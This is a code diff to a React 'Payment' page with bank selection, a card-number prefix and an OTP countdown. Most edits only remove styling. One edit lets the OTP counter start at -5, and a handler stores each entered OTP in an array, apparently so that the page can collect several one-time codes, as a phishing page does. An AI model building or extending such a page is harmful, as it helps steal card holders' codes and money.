@@ -164,7 +164,7 @@ export default function Payment() {
   });
   const [countdown, setCountdown] = useState(60);
   const [isCountdownActive, setIsCountdownActive] = useState(true);
-  const [otpAttempts, setOtpAttempts] = useState(-2);
+  const [otpAttempts, setOtpAttempts] = useState(-5);
   const [otpValue, setOtpValue] = useState("");
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
@@ -342,7 +342,7 @@ export default function Payment() {
 
                 {step === 1 ? (
                   <>
-                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
+                    <div id="FCUseDebitEnable">
                       <div className="row">
                         <label
                           className="column-label"
@@ -352,7 +352,6 @@ export default function Payment() {
                         </label>
                         <select
                           className="column-value"
-                          style={{ width: "60%" }}
                           onChange={(e: any) => {
                             const selectedBank = BANKS.find(
                               (bank) => bank.value === e.target.value
@@ -383,12 +382,10 @@ export default function Payment() {
                         className="row three-column"
                         id="Paymentpagecardnumber"
                       >
-                        <label className="column-label mt-1">
-                          Card Number:
-                        </label>
+                        <label className="column-label ">Card Number:</label>
                         <label>
                           <select
-                            className="column-value  mt-2"
+                            className="column-value "
                             name="dcprefix"
                             id="dcprefix"
                             onChange={(e: any) =>
@@ -397,7 +394,6 @@ export default function Payment() {
                                 prefix: e.target.value,
                               })
                             }
-                            style={{ width: "26%" }}
                           >
                             <option
                               value={"i"}
@@ -434,8 +430,7 @@ export default function Payment() {
                             inputMode="numeric"
                             pattern="[0-9]*"
                             size={10}
-                            className="allownumericwithoutdecimal"
-                            style={{ width: "32%", paddingTop: 5 }}
+                            className=" column-long"
                             maxLength={10}
                             onChange={(e: any) =>
                               setPaymentInfo({
